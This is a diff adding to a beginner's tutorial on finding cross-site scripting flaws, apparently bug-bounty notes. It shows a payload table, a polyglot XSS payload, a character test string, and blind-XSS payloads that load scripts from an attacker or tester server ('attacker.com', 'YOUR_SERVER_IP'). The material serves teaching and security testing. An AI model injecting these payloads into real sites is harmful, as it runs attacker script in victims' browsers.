@@ -308,3 +308,29 @@ Check your browsers console and see if there are any errors loading the page.
 | `<script>alert(1)<!-`                 | This payload will comment out the rest of the line in the HTML doc to prevent syntax errors                                      |
 | `<a onmouseover"alert(1)">test</a>`   | Inserts a link that will cause Javascript to run after user hovers over the link                                                 |
 | `<script src=//attacker.com/test.js`> | Causes the browser to load and run an external script hosted on the attackers server                                             |
+Hackers have designed many more creative ways to create XSS payloads, Search `XSS payloads` online for more ideas. 
+A polyglot type of XSS payload that executes in multiple contexts, regardless of if its inserted into an `<img>` or a script `<script>`. 
+
+```html
+javascript:"/*\"/*`/*' /*</template>
+</textarea></noembed></noscript></title>
+</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+```
+
+This is setup so that if one fails it still has more chances to try another means, it is the beyond the scope for a beginner. 
+Use a generic test string instead of XSS payloads such as `>'<"//:=;!--` and take note of which characters that application does and doesn't escape. 
+Its then we can start to construct our payload based on characters that aren't being properly sanitized. 
+Blind XSS flaws are hard to detect, try and make a victims browser make a request to a server of your own. 
+
+```html
+<script src='http://YOUR_SERVER_IP/xss'></script>
+```
+
+Then your able to monitor your server logs to see if anyone made a request.
+If found, then a blind XSS has been triggered. 
+#### Step 3: Confirm The Impact
+Check your payload on the destination page, check if your means of signaling for an XSS like an alert box has been triggered. 
+Your payload could be used to construct other things in the future such as web pages, emails, and file portals. Time delays are also pretty common. 
+Sometimes a payload is triggered only during specific conditions such as an admin being logged in or a user interacts with specific HTML elements. 
+Confirm the impact of the XSS payload by browsing the necessary pages and performing those actions. 
+## Bypassing XSS Protection
